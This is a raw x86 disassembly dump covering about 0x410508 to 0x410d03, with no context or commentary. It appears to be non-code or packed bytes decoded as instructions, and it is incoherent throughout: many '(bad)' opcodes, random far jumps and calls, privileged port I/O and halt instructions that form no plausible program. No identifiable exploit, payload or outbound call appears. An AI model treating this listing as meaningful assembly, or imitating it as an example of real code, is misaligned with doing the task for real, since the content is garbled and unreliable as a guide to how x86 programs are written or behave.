  410508:	xor    DWORD PTR [edi-0x42999358],esi
  41050e:	sub    esi,esp
  410510:	imul   DWORD PTR [ebp-0x64]
  410513:	adc    bh,BYTE PTR [ebx-0x4de59c66]
  410519:	cdq    
  41051a:	pusha  
  41051b:	adc    al,0xe0
  41051d:	or     ah,BYTE PTR [ebx+0x5c350ecc]
  410523:	push   0xffffffe7
  410525:	pop    ebx
  410526:	jle    0x4104d0
  410528:	rol    DWORD PTR [ecx+0x58],1
  41052b:	add    BYTE PTR [ecx+ecx*2],0x7f
  41052f:	inc    esi
  410530:	jmp    0xc9589e0d
  410535:	pop    eax
  410536:	das    
  410537:	sub    bl,al
  410539:	ror    DWORD PTR [esi+0x448bf534],cl
  41053f:	dec    edx
  410540:	mov    edx,0x3ed808db
  410545:	mov    ebx,0x16632cae
  41054a:	pop    esp
  41054b:	xor    dh,dh
  41054d:	imul   ebp,DWORD PTR [edx-0x50ac5862],0x988879e7
  410557:	pop    esi
  410558:	or     BYTE PTR [esi+0x7484a06e],bl
  41055e:	shl    DWORD PTR [esi-0x58],1
  410561:	mov    ebx,0xe71a4b82
  410566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410567:	mov    bl,BYTE PTR [ebx+ebp*2]
  41056a:	icebp  
  41056b:	dec    eax
  41056c:	xchg   ebx,eax
  41056d:	fistp  WORD PTR [esi+0x71]
  410570:	jl     0x4105c5
  410572:	adc    al,0xa8
  410574:	and    ecx,esp
  410576:	mov    ds:0x4670f25f,al
  41057b:	adc    eax,DWORD PTR [ecx+0x6a6f78fa]
  410581:	sub    esp,edx
  410583:	sar    BYTE PTR [edx+0x66],cl
  410586:	add    bl,BYTE PTR [esi]
  410588:	and    BYTE PTR [edx+ebx*1-0x23],bh
  41058c:	add    dl,BYTE PTR [ebp+ebp*1-0x3c13b228]
  410593:	gs or  al,bh
  410596:	inc    edx
  410597:	sar    DWORD PTR [eax+edi*8+0x5ce5662f],cl
  41059e:	inc    ebp
  41059f:	xchg   ebp,eax
  4105a0:	mov    eax,ds:0x3e0a7526
  4105a5:	mov    ecx,0x60fba439
  4105aa:	lods   al,BYTE PTR ds:[esi]
  4105ab:	mov    edi,0xde8e4fcd
  4105b0:	in     al,dx
  4105b1:	sub    ecx,DWORD PTR [ebp+0x6e]
  4105b4:	or     dl,BYTE PTR [eax-0x33]
  4105b7:	or     al,0xdc
  4105b9:	retf   
  4105ba:	push   cs
  4105bb:	mov    DWORD PTR [ecx+0x61],ebx
  4105be:	mov    dl,0xb
  4105c0:	pop    esi
  4105c1:	out    0x62,eax
  4105c3:	rcl    BYTE PTR [edi+0x6e],1
  4105c6:	pusha  
  4105c7:	int    0x19
  4105c9:	mov    ebx,DWORD PTR [ebp+0x77]
  4105cc:	aam    0x22
  4105ce:	push   ebp
  4105cf:	fsub   DWORD PTR [eax+0x39]
  4105d2:	scas   al,BYTE PTR es:[edi]
  4105d3:	loope  0x410556
  4105d5:	fwait
  4105d6:	retf   
  4105d7:	ror    DWORD PTR [edi],cl
  4105d9:	sar    DWORD PTR [eax-0x43],1
  4105dc:	pusha  
  4105dd:	fstp   TBYTE PTR [edi]
  4105df:	jmp    0x4481:0x9cc93b85
  4105e6:	les    ebx,FWORD PTR [eax+ebx*4-0x17091fe9]
  4105ed:	mov    al,0x9
  4105ef:	or     DWORD PTR [esi+ebp*4],eax
  4105f2:	in     al,dx
  4105f3:	(bad)  
  4105f4:	xor    al,0x92
  4105f6:	(bad)  
  4105f7:	sub    eax,0x3feb1a38
  4105fc:	lods   eax,DWORD PTR ds:[esi]
  4105fd:	lahf   
  4105fe:	mov    al,ds:0x37533141
  410603:	mov    al,ds:0xa7e03a3c
  410608:	jns    0x410678
  41060a:	cmp    bh,dl
  41060c:	push   ecx
  41060d:	in     al,0xc9
  41060f:	fidiv  WORD PTR [edx+eiz*1-0x947866]
  410616:	in     al,0x4c
  410618:	cdq    
  410619:	pop    esi
  41061a:	(bad)  
  41061b:	aad    0xc
  41061d:	pushf  
  41061e:	pop    ecx
  41061f:	jo     0x4105ff
  410621:	xchg   edx,eax
  410622:	or     DWORD PTR [edx-0x38],esi
  410625:	frstpm(287 only) 
  410627:	gs push ds
  410629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41062a:	fadd   DWORD PTR [edx+0x5136f9ec]
  410630:	call   0xef1b:0x496c1c94
  410637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410638:	adc    bh,cl
  41063a:	or     BYTE PTR [esi-0x67647208],0x86
  410641:	popa   
  410642:	hlt    
  410643:	jae    0x41064f
  410645:	std    
  410646:	add    al,0x77
  410648:	pop    esp
  410649:	gs ret 
  41064b:	cmp    al,0xcf
  41064d:	mov    DWORD PTR [ebp+0x22bbbece],ebp
  410653:	call   0xe067744f
  410658:	jecxz  0x41068d
  41065a:	in     al,dx
  41065b:	mov    ebp,0xb849ee60
  410660:	sbb    al,0x81
  410662:	stc    
  410663:	enter  0x9a22,0x13
  410667:	mov    BYTE PTR [edi],cl
  410669:	push   es
  41066a:	xchg   ebp,eax
  41066b:	jp     0x410699
  41066d:	int3   
  41066e:	inc    esi
  41066f:	cwde   
  410670:	js     0x4106ae
  410672:	pop    eax
  410673:	repz dec ebp
  410675:	std    
  410676:	add    BYTE PTR [eax+0x27],bh
  410679:	dec    edi
  41067a:	or     DWORD PTR ds:0x24f1bfa6,eax
  410680:	mov    dh,0x62
  410682:	push   ebp
  410683:	aas    
  410684:	or     BYTE PTR [ecx-0x4f220e2e],bl
  41068a:	in     al,dx
  41068b:	cmp    eax,0xe81ad3ac
  410690:	rol    DWORD PTR [ebp+0xf7ec60c],cl
  410696:	(bad)
  410699:	pop    esp
  41069a:	inc    ecx
  41069b:	push   0x4335e668
  4106a0:	rcl    dl,cl
  4106a2:	mov    ebx,0xf4117723
  4106a7:	xor    bl,BYTE PTR [edx+0x5e]
  4106aa:	retf   0x5082
  4106ad:	repz mov bl,0x5a
  4106b0:	fsubr  QWORD PTR [ebp-0x5b525ec8]
  4106b6:	out    0x5d,eax
  4106b8:	xor    eax,DWORD PTR [edx]
  4106ba:	daa    
  4106bb:	xor    al,dh
  4106bd:	shr    bl,1
  4106bf:	out    0x39,eax
  4106c1:	leave  
  4106c2:	daa    
  4106c3:	push   ecx
  4106c4:	lds    eax,FWORD PTR [edx+0x1c041bbe]
  4106ca:	xchg   DWORD PTR [ebx],eax
  4106cc:	cli    
  4106cd:	mov    edi,0xfeaa2e32
  4106d2:	sbb    BYTE PTR [edx-0x28c536ba],bl
  4106d8:	into   
  4106d9:	pop    esi
  4106da:	or     BYTE PTR [edi+0x63],ch
  4106dd:	add    DWORD PTR [ebx],0x82932c2f
  4106e3:	adc    BYTE PTR ds:0xc1c41434,ch
  4106e9:	and    BYTE PTR [ebx+0x4881cd71],0xe
  4106f0:	push   cs
  4106f1:	hlt    
  4106f2:	mov    es,WORD PTR [ecx+0x41]
  4106f5:	int3   
  4106f6:	dec    edi
  4106f7:	cli    
  4106f8:	mov    dh,0x55
  4106fa:	pop    edx
  4106fb:	lahf   
  4106fc:	daa    
  4106fd:	aaa    
  4106fe:	out    dx,eax
  4106ff:	add    eax,0x17a50d5
  410704:	pop    edx
  410705:	mov    esp,0x4f88e5b1
  41070a:	repnz lods eax,DWORD PTR ds:[esi]
  41070c:	push   ss
  41070d:	mov    ebx,0xcb5235db
  410712:	stos   DWORD PTR es:[edi],eax
  410713:	cli    
  410714:	jp     0x4106f9
  410716:	shr    ebx,cl
  410718:	dec    esp
  410719:	mov    ecx,0x3490a854
  41071e:	sub    dl,BYTE PTR [ecx-0x71ba21e7]
  410724:	pop    ebx
  410725:	xchg   dh,dl
  410727:	neg    DWORD PTR [ebx+esi*4+0x1cb7be63]
  41072e:	sub    eax,0xf6d0e381
  410733:	test   eax,0x4d7529bc
  410738:	push   ss
  410739:	mov    bl,0x52
  41073b:	dec    esp
  41073c:	test   al,0xf7
  41073e:	mov    bl,BYTE PTR [edx+ebx*2-0x4a9bf2a7]
  410745:	outs   dx,BYTE PTR ds:[esi]
  410746:	jmp    0xd60539c6
  41074b:	adc    al,BYTE PTR [ebx+0x39]
  41074e:	jmp    0xc8f8cf9e
  410753:	cwde   
  410754:	sbb    bl,BYTE PTR [edi+0x7653a39a]
  41075a:	mov    BYTE PTR [edi],ah
  41075c:	out    dx,al
  41075d:	and    ebp,esi
  41075f:	sub    eax,0x86cfa128
  410764:	(bad)  
  410765:	fs dec ecx
  410767:	aas    
  410768:	mov    ds:0xbab68ad0,eax
  41076d:	popa   
  41076e:	repnz (bad) 
  410770:	(bad)  
  410771:	(bad)  
  410772:	xor    BYTE PTR [ecx+0x69],dh
  410775:	pop    eax
  410776:	stos   DWORD PTR es:[edi],eax
  410777:	call   0xc2c42dc3
  41077c:	sti    
  41077d:	iret   
  41077e:	or     al,0xae
  410780:	pop    edx
  410781:	push   ebp
  410782:	cmp    DWORD PTR [ecx-0x46],eax
  410785:	jg     0x4107e1
  410787:	xlat   BYTE PTR ds:[ebx]
  410788:	sub    DWORD PTR [edx-0x49],edi
  41078b:	pop    edx
  41078c:	data16 addr16 mov ah,0xbc
  410790:	and    bl,al
  410792:	jge    0x4107b9
  410794:	add    DWORD PTR ds:0x319df58d,ecx
  41079a:	pop    ebp
  41079b:	cwde   
  41079c:	xchg   ebp,eax
  41079d:	fwait
  41079e:	minps  xmm0,XMMWORD PTR [edi-0x237f4211]
  4107a5:	inc    ecx
  4107a6:	and    cl,cl
  4107a8:	in     eax,dx
  4107a9:	jns    0x4107a0
  4107ab:	add    eax,0xb74c2ccd
  4107b0:	push   ss
  4107b1:	out    0x43,al
  4107b3:	pop    ds
  4107b4:	sahf   
  4107b5:	ds cmp dl,ch
  4107b8:	jle    0x4107d3
  4107ba:	test   esi,esi
  4107bc:	retf   
  4107bd:	push   edi
  4107be:	out    0x91,eax
  4107c0:	call   0xadf6e477
  4107c5:	(bad)  
  4107c6:	and    ebx,DWORD PTR [edi+0x4c9e3a8a]
  4107cc:	dec    esp
  4107cd:	jae    0x410838
  4107cf:	aaa    
  4107d0:	(bad)  [ebx+0x71]
  4107d3:	dec    edi
  4107d4:	(bad)  
  4107d5:	(bad)  [edi-0x20d57dea]
  4107db:	sahf   
  4107dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107dd:	sti    
  4107de:	xchg   ebx,eax
  4107df:	dec    edi
  4107e0:	xchg   edx,eax
  4107e1:	cmp    al,0xad
  4107e3:	inc    ebx
  4107e4:	sbb    al,0x5b
  4107e6:	aam    0x86
  4107e8:	jmp    0x410822
  4107ea:	jno    0x410834
  4107ec:	mov    ah,0x25
  4107ee:	and    BYTE PTR [edi],dh
  4107f0:	retf   0x94ab
  4107f3:	bnd jmp 0x410859
  4107f6:	push   ss
  4107f7:	outs   dx,DWORD PTR ds:[esi]
  4107f8:	jp     0x4107bb
  4107fa:	jle    0x41080e
  4107fc:	cmp    BYTE PTR [ebx-0x64],ch
  4107ff:	nop
  410800:	sub    al,0x97
  410802:	xor    al,0xc5
  410804:	mov    cl,0x3c
  410806:	inc    esi
  410807:	enter  0x36fd,0x45
  41080b:	cwde   
  41080c:	(bad)  
  41080d:	test   DWORD PTR [eax+0x8a3116c],0x9f951b7e
  410817:	rcl    DWORD PTR [bx+0x4],0x51
  41081c:	call   0xd589f64d
  410821:	cli    
  410822:	aaa    
  410823:	out    dx,al
  410824:	and    al,0x9b
  410826:	xor    eax,eax
  410828:	shl    edx,0x1e
  41082b:	mov    DWORD PTR [ebp+0x10],eax
  41082e:	jmp    0x410db8
  410833:	mov    DWORD PTR [edi],ebx
  410835:	adc    al,0xee
  410837:	sbb    ah,ah
  410839:	cmp    BYTE PTR [ecx],bl
  41083b:	jne    0x4107e5
  41083d:	es je  0x410865
  410840:	or     eax,0x546c6ea6
  410845:	push   ss
  410846:	push   ss
  410847:	cmp    eax,0x7b161604
  41084c:	loopne 0x41085c
  41084e:	sub    al,0xba
  410850:	mov    cl,0x46
  410852:	test   BYTE PTR [ecx],al
  410854:	xchg   ebp,eax
  410855:	xchg   edx,eax
  410856:	pop    edi
  410857:	aaa    
  410858:	cmp    ah,BYTE PTR [ecx+0x7f]
  41085b:	out    0x9d,al
  41085d:	pushf  
  41085e:	xchg   esp,eax
  41085f:	fwait
  410860:	int    0xb3
  410862:	scas   eax,DWORD PTR es:[edi]
  410863:	enter  0xa6f0,0xac
  410867:	fidiv  DWORD PTR cs:[ecx+eax*1+0xfe74d47]
  41086f:	pop    eax
  410870:	push   0x14187d0b
  410875:	mov    ah,0xf6
  410877:	xor    DWORD PTR [eax-0x1a],esi
  41087a:	(bad)  
  41087b:	rol    dl,1
  41087d:	push   0xffffffc0
  41087f:	cmp    eax,0xa2ffce83
  410884:	test   eax,0xb7c8b881
  410889:	sbb    al,0xa4
  41088b:	pusha  
  41088c:	iret   
  41088d:	push   ecx
  41088e:	lea    esp,[ebp+0x4f9d1355]
  410894:	repz push edx
  410896:	inc    ebp
  410897:	sbb    DWORD PTR [edx],esp
  410899:	iret   
  41089a:	ror    DWORD PTR [ebp+0x79b01829],1
  4108a0:	ror    BYTE PTR [ebx+0x70cb8f81],cl
  4108a6:	or     BYTE PTR [ebp+0x46],bh
  4108a9:	call   0x3218dfcd
  4108ae:	daa    
  4108af:	xchg   DWORD PTR [edi-0xcccd507],esi
  4108b5:	nop
  4108b6:	xchg   esi,eax
  4108b7:	es aas 
  4108b9:	fisttp WORD PTR [edi+0x22]
  4108bc:	xchg   edx,eax
  4108bd:	enter  0x7460,0x1e
  4108c1:	in     al,dx
  4108c2:	add    DWORD PTR [edx-0x7c98e3b7],ebp
  4108c8:	xchg   esi,eax
  4108c9:	dec    edi
  4108ca:	sbb    eax,0x5607b214
  4108cf:	pushf  
  4108d0:	pop    ds
  4108d1:	cli    
  4108d2:	(bad)  
  4108d3:	int    0x22
  4108d5:	outs   dx,DWORD PTR ds:[esi]
  4108d6:	loop   0x41087a
  4108d8:	mov    WORD PTR [edx+edi*1+0x503e3da6],cs
  4108df:	idiv   edi
  4108e1:	mov    al,0x90
  4108e3:	pop    edi
  4108e4:	test   eax,0x2958207b
  4108ea:	dec    ecx
  4108eb:	sbb    eax,0x546b05d0
  4108f0:	adc    BYTE PTR [ecx+0x5dbeafd2],ah
  4108f6:	(bad)
  4108f9:	ret    0x4fad
  4108fc:	push   edi
  4108fd:	dec    ecx
  4108fe:	push   edi
  4108ff:	sub    eax,0x8d63ee57
  410904:	or     BYTE PTR [edx+ebp*2],ah
  410907:	gs nop
  410909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090a:	sbb    DWORD PTR [edi],0x10
  41090d:	push   eax
  41090e:	push   esp
  41090f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410910:	or     DWORD PTR [edx+0x652ca7a3],0x3f
  410917:	sti    
  410918:	xor    al,0xb2
  41091a:	push   es
  41091b:	test   BYTE PTR [edx+0x11],dh
  41091e:	jmp    0x64936cd4
  410923:	pop    ecx
  410924:	in     eax,0x44
  410926:	or     DWORD PTR [ebp-0x9],0x37
  41092a:	mov    dh,0x8d
  41092c:	lods   eax,DWORD PTR ds:[esi]
  41092d:	out    0x0,eax
  41092f:	fsubp  st(6),st
  410931:	pop    es
  410932:	xlat   BYTE PTR ds:[ebx]
  410933:	shr    BYTE PTR [esp+ebp*2+0x6f941bfe],cl
  41093a:	xor    edi,DWORD PTR [eax-0x60]
  41093d:	setge  BYTE PTR [ecx]
  410940:	and    BYTE PTR [esi],bh
  410942:	popa   
  410943:	(bad)  
  410944:	stos   DWORD PTR es:[edi],eax
  410945:	jnp    0x4108e6
  410947:	mov    esp,0xc6266078
  41094c:	and    al,0x30
  41094e:	jns    0x4109c2
  410950:	into   
  410951:	or     BYTE PTR [ecx],al
  410953:	xor    al,0x57
  410955:	repz sbb BYTE PTR [edi+0x12],0x79
  41095a:	or     bl,al
  41095c:	fcmovnu st,st(1)
  41095e:	hlt    
  41095f:	(bad)  ds:0x9df9dc51
  410965:	inc    ecx
  410966:	mov    esp,0xfbae783
  41096b:	jmp    0x9f84:0xd21f50bb
  410972:	ins    DWORD PTR es:[edi],dx
  410973:	fistp  WORD PTR [edx+ebx*1-0x4d]
  410977:	jbe    0x410962
  410979:	mov    fs:0xf31f9aa6,eax
  41097f:	push   0xffffff9a
  410981:	jmp    0xb6f9:0xfdc67227
  410988:	and    eax,0xd116672b
  41098d:	gs js  0x4109b9
  410990:	pop    ebp
  410991:	add    ch,dl
  410993:	repnz mov ah,BYTE PTR [edx-0x3868cfa7]
  41099a:	sbb    eax,0x6665711a
  41099f:	jbe    0x410a01
  4109a1:	sbb    edi,DWORD PTR [esi]
  4109a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a4:	mov    ds:0xfba98f03,al
  4109a9:	inc    edx
  4109aa:	aad    0x23
  4109ac:	out    0xba,al
  4109ae:	aaa    
  4109af:	or     BYTE PTR [edi+ecx*8],ch
  4109b2:	xchg   ecx,eax
  4109b3:	dec    esp
  4109b4:	mov    ebx,0xca274609
  4109b9:	mov    esp,0xf510d988
  4109be:	cld    
  4109bf:	xchg   bl,dl
  4109c1:	xchg   esp,eax
  4109c2:	pop    ecx
  4109c3:	xor    dh,BYTE PTR [ebp+0x45]
  4109c6:	nop
  4109c7:	rcr    DWORD PTR [ecx],cl
  4109c9:	xchg   ebp,eax
  4109ca:	int    0xd8
  4109cc:	and    ah,ah
  4109ce:	jno    0x4109b1
  4109d0:	ret    0xa6b0
  4109d3:	mov    ds:0xfc323279,al
  4109d8:	outs   dx,DWORD PTR ds:[esi]
  4109d9:	aaa    
  4109da:	push   cs
  4109db:	xor    eax,0xefebbc99
  4109e0:	arpl   WORD PTR [eax],sp
  4109e2:	push   es
  4109e3:	xchg   BYTE PTR [edi+0x29675614],ch
  4109e9:	xchg   edi,edx
  4109eb:	adc    DWORD PTR [eax-0x15],ebx
  4109ee:	fnstsw WORD PTR [esi-0x1b]
  4109f1:	push   edx
  4109f2:	cli    
  4109f3:	fdiv   QWORD PTR [ebx]
  4109f5:	xor    dh,BYTE PTR [ecx+0x630910fb]
  4109fb:	add    al,0xdd
  4109fd:	mov    BYTE PTR [ebp+0x4af2818b],dl
  410a03:	out    dx,eax
  410a04:	or     DWORD PTR [ebx*8-0x6d39b2fb],edi
  410a0b:	in     al,dx
  410a0c:	xor    dl,BYTE PTR [ebx+ebp*1-0x56]
  410a10:	test   DWORD PTR [edx+0x35b0fa8c],0x67263ccf
  410a1a:	pop    esi
  410a1b:	dec    edx
  410a1c:	dec    esp
  410a1d:	sbb    BYTE PTR [ebx+esi*1+0x54],ah
  410a21:	ds ins DWORD PTR es:[edi],dx
  410a23:	int    0xc1
  410a25:	stos   DWORD PTR es:[edi],eax
  410a26:	or     dl,BYTE PTR [ecx-0x5f]
  410a29:	call   0x9b25784c
  410a2e:	push   eax
  410a2f:	popa   
  410a30:	cmp    DWORD PTR [edi+0x6655b35f],ebp
  410a36:	loopne 0x410a8b
  410a38:	sbb    al,0x5e
  410a3a:	mov    esp,0x12d807f8
  410a3f:	pop    edx
  410a40:	jbe    0x410a2c
  410a42:	sbb    eax,0xa9144b8f
  410a47:	retf   0xee3
  410a4a:	and    BYTE PTR [eax+0x530c8f67],al
  410a50:	jne    0x4109f3
  410a52:	int    0xbe
  410a54:	mov    DWORD PTR [ebx+ecx*4-0x80],eax
  410a58:	ror    BYTE PTR [eax-0x32],cl
  410a5b:	mov    ch,0x80
  410a5d:	mov    dh,0x77
  410a5f:	retf   
  410a60:	rol    DWORD PTR [ecx+0x4ab707a8],cl
  410a66:	test   BYTE PTR [ebx+0x56273cf0],al
  410a6c:	loop   0x410a9a
  410a6e:	in     eax,0xde
  410a70:	jp     0x410ac3
  410a72:	and    edi,0xffffffe3
  410a75:	pop    ds
  410a76:	fwait
  410a77:	or     dh,BYTE PTR [esi]
  410a79:	hlt    
  410a7a:	test   BYTE PTR ds:0xd094f019,ah
  410a80:	mov    WORD PTR [ecx+edi*1+0x2e53da96],?
  410a87:	xchg   ecx,eax
  410a88:	(bad)  
  410a8a:	addr16 inc ecx
  410a8c:	mov    ch,0x7b
  410a8e:	push   es
  410a8f:	cwde   
  410a90:	repnz and al,0x97
  410a93:	jnp    0x410a87
  410a95:	aad    0x75
  410a97:	sbb    DWORD PTR [ecx-0x45cee4f4],eax
  410a9d:	push   edx
  410a9e:	or     al,0x9e
  410aa0:	push   ebx
  410aa1:	test   al,0x4a
  410aa3:	dec    eax
  410aa4:	pop    eax
  410aa5:	jns    0x410ab9
  410aa7:	in     al,dx
  410aa8:	sub    BYTE PTR [edi],ah
  410aaa:	ds pop eax
  410aac:	xchg   dh,ah
  410aae:	das    
  410aaf:	loope  0x410b01
  410ab1:	mov    DWORD PTR [ebp-0x5b725896],edi
  410ab7:	rcr    DWORD PTR [ebx],1
  410ab9:	ins    DWORD PTR es:[edi],dx
  410aba:	(bad)  
  410abb:	into   
  410abc:	jno    0x410a78
  410abe:	push   edi
  410abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ac0:	(bad)  
  410ac1:	aaa    
  410ac2:	xchg   ecx,eax
  410ac3:	mov    edi,0xb6ce8876
  410ac8:	loop   0x410b0a
  410aca:	stos   DWORD PTR es:[edi],eax
  410acb:	mov    al,ds:0xcf4cc7b6
  410ad0:	retf   
  410ad1:	test   BYTE PTR [esi+0x38],bl
  410ad4:	sbb    DWORD PTR [ecx+0x57],0x1062fd12
  410adb:	mov    dl,0x49
  410add:	in     al,0x4c
  410adf:	cmp    dh,BYTE PTR [ebx+edi*8]
  410ae2:	dec    ecx
  410ae3:	and    al,0x86
  410ae5:	mov    ebx,0x1b72161c
  410aea:	or     eax,0xffc64258
  410aef:	inc    edi
  410af0:	jo     0x410b05
  410af2:	dec    esp
  410af3:	jns    0x410b24
  410af5:	inc    esp
  410af6:	rcr    edx,1
  410af8:	xor    eax,0x37603c95
  410afd:	fisubr DWORD PTR ds:0x8505a247
  410b03:	inc    eax
  410b04:	(bad)  [eax+0x4]
  410b07:	loopne 0x410aba
  410b09:	pop    es
  410b0a:	int    0x1b
  410b0c:	inc    ebp
  410b0d:	lahf   
  410b0e:	or     edi,DWORD PTR ds:0x4cb42e84
  410b14:	dec    esi
  410b15:	jns    0x410b23
  410b17:	out    0xa5,eax
  410b19:	mov    esi,edi
  410b1b:	jnp    0x410b05
  410b1d:	pop    edi
  410b1e:	push   ds
  410b1f:	pop    esi
  410b20:	push   esi
  410b21:	sub    DWORD PTR [edx+0x5c3b5591],0x4c
  410b28:	lods   eax,DWORD PTR ds:[esi]
  410b29:	sub    ebx,DWORD PTR [edi-0x566f6cde]
  410b2f:	and    edx,esp
  410b31:	xlat   BYTE PTR ds:[ebx]
  410b32:	mov    ebp,0x7226b10a
  410b37:	sub    edx,eax
  410b39:	push   eax
  410b3a:	repnz pop esp
  410b3c:	jmp    0x7c442c96
  410b41:	das    
  410b42:	stos   DWORD PTR es:[edi],eax
  410b43:	stc    
  410b44:	and    bh,BYTE PTR [eax]
  410b46:	bnd jle 0x410b59
  410b49:	fbld   TBYTE PTR [ecx-0x5ee0480f]
  410b4f:	pop    edi
  410b50:	inc    eax
  410b51:	call   0x3bf7:0x620543db
  410b58:	mov    dl,0x53
  410b5a:	popf   
  410b5b:	lahf   
  410b5c:	sahf   
  410b5d:	and    al,0x57
  410b5f:	test   BYTE PTR [edx-0x42],ch
  410b62:	jmp    0x410b82
  410b64:	jle    0x410af0
  410b66:	add    esp,esp
  410b68:	and    ah,BYTE PTR [eax+0x67c02a07]
  410b6e:	call   DWORD PTR [ecx+ebp*4-0x1b46c7c7]
  410b75:	and    DWORD PTR [edi],edx
  410b77:	inc    eax
  410b78:	sbb    ecx,DWORD PTR [ebp-0x28c18640]
  410b7e:	jnp    0x410bef
  410b80:	jmp    0xf795c2b4
  410b85:	cs call 0x91dd:0xd08f7ca7
  410b8d:	aaa    
  410b8e:	sub    BYTE PTR [edx+0x3c22897f],0xe9
  410b95:	ror    cl,0x18
  410b98:	mov    ds:0xe626f436,al
  410b9d:	(bad)  
  410b9e:	xlat   BYTE PTR ds:[ebx]
  410b9f:	push   es
  410ba0:	out    0xbb,al
  410ba2:	out    dx,al
  410ba3:	sbb    al,al
  410ba5:	out    0x8b,eax
  410ba7:	pushf  
  410ba8:	rol    BYTE PTR ds:0x5aa46204,0x27
  410baf:	addr16 dec eax
  410bb1:	ds mov dh,0xe6
  410bb4:	rcl    DWORD PTR [edx+0x453a360e],1
  410bba:	mov    ch,0xc3
  410bbc:	push   esp
  410bbd:	pop    esp
  410bbe:	clc    
  410bbf:	push   esi
  410bc0:	mov    ds:0x2e8f3c48,eax
  410bc5:	shl    BYTE PTR [esi],0x53
  410bc8:	xlat   BYTE PTR ds:[ebx]
  410bc9:	push   0xfffffff4
  410bcb:	pop    es
  410bcc:	rol    DWORD PTR [edx],1
  410bce:	sub    BYTE PTR [edi+0x49],ch
  410bd1:	cmp    eax,0xa7038165
  410bd6:	cld    
  410bd7:	mov    ebp,0x3f1c310
  410bdc:	mov    ch,0x6b
  410bde:	xlat   BYTE PTR ds:[ebx]
  410bdf:	inc    esp
  410be0:	dec    eax
  410be1:	mov    ds:0x8b330207,eax
  410be6:	inc    esi
  410be7:	xor    eax,DWORD PTR [edx-0x71f731ce]
  410bed:	cmp    al,0xf8
  410bef:	mov    ss,WORD PTR [ebx+0x43]
  410bf2:	nop
  410bf3:	jmp    0x9cfe:0x1e3dec4e
  410bfa:	and    al,0x64
  410bfc:	pop    es
  410bfd:	scas   eax,DWORD PTR es:[edi]
  410bfe:	daa    
  410bff:	xchg   ecx,eax
  410c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c01:	sub    al,0x70
  410c03:	sub    eax,0x81e735d4
  410c08:	jns    0x410bfd
  410c0a:	test   BYTE PTR [ebx],dh
  410c0c:	and    eax,0xd848c9b0
  410c11:	mov    al,0xf7
  410c13:	loopne 0x410bc0
  410c15:	push   edi
  410c16:	add    eax,0xb091b30a
  410c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c1c:	sbb    al,0x7
  410c1e:	pop    ss
  410c1f:	push   ebp
  410c20:	pop    ds
  410c21:	and    ebp,ebx
  410c23:	(bad)  
  410c24:	and    BYTE PTR [ecx-0x6a],dh
  410c27:	cmp    esi,DWORD PTR [edx-0x73eecfe4]
  410c2d:	jg     0x410c0d
  410c2f:	mov    ah,0x17
  410c31:	mov    ebp,DWORD PTR ds:0xe5614473
  410c37:	das    
  410c38:	mov    esp,0x53ce2e31
  410c3d:	pop    esp
  410c3e:	out    0x98,al
  410c40:	push   edx
  410c41:	mov    gs,WORD PTR [esi]
  410c43:	jnp    0x410cbb
  410c45:	sub    cl,ch
  410c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c48:	push   esi
  410c49:	and    bl,BYTE PTR [ebx-0x32f30100]
  410c4f:	popa   
  410c50:	shl    BYTE PTR [ebx-0x75],0xce
  410c54:	in     al,dx
  410c55:	xor    eax,0xa53085db
  410c5a:	sar    BYTE PTR [esi],0xdf
  410c5d:	ret    
  410c5e:	pop    edi
  410c5f:	shr    BYTE PTR [esi-0x27],cl
  410c62:	xchg   cl,bh
  410c64:	mov    ebx,0xba4e1240
  410c69:	imul   ch
  410c6b:	test   BYTE PTR [esi+0x69],bh
  410c6e:	shl    DWORD PTR [ebp+0x2c],0xd7
  410c72:	loop   0x410cf2
  410c74:	and    ch,BYTE PTR ds:0x8540d00
  410c7a:	test   al,0x15
  410c7c:	mov    edx,0xa89ed2e2
  410c81:	and    bl,BYTE PTR [edi+0x44]
  410c84:	imul   esp,DWORD PTR [ebx-0x27],0x1e949977
  410c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8c:	xchg   BYTE PTR [edi+ebx*2+0x2f],bh
  410c90:	stos   BYTE PTR es:[edi],al
  410c91:	push   ecx
  410c92:	lock shr DWORD PTR [esi],0x8b
  410c96:	inc    ebp
  410c97:	inc    eax
  410c98:	fnsave [ebp+0x8465961]
  410c9e:	mov    bh,0xa7
  410ca0:	jmp    0x6553612a
  410ca5:	jecxz  0x410c99
  410ca7:	scas   al,BYTE PTR es:[edi]
  410ca8:	sub    eax,0x556987c6
  410cad:	fdivr  QWORD PTR [edi+eax*4+0x34]
  410cb1:	sub    ah,BYTE PTR [ecx+0x2b0ab253]
  410cb7:	jmp    0x34c593c4
  410cbc:	jae    0x410c9f
  410cbe:	cld    
  410cbf:	aad    0xcc
  410cc1:	or     cl,BYTE PTR [eax-0x7c9a3421]
  410cc7:	fwait
  410cc8:	mov    cl,0xd8
  410cca:	imul   esp,DWORD PTR [ebx],0x669ae3e7
  410cd0:	fnsave [eax-0x7a]
  410cd3:	pop    ss
  410cd4:	xlat   BYTE PTR ds:[ebx]
  410cd5:	mov    esi,0x42e1eace
  410cda:	push   ss
  410cdb:	in     eax,dx
  410cdc:	push   ss
  410cdd:	pop    ebp
  410cde:	mov    ?,WORD PTR [eax-0x1104d2ad]
  410ce4:	xchg   ebx,eax
  410ce5:	fcom   DWORD PTR [di-0x67]
  410ce9:	push   ecx
  410cea:	mov    esp,0x389caa90
  410cef:	lahf   
  410cf0:	xchg   esp,eax
  410cf1:	popf   
  410cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cf3:	mov    ebp,0xe60fe8db
  410cf8:	(bad)  
  410cf9:	jns    0x410ce7
  410cfb:	out    dx,al
  410cfc:	sbb    ecx,esp
  410cfe:	dec    ebp
  410cff:	adc    esp,eax
  410d01:	je     0x410caf
  410d03:	xor    dh,BYTE PTR [edi]
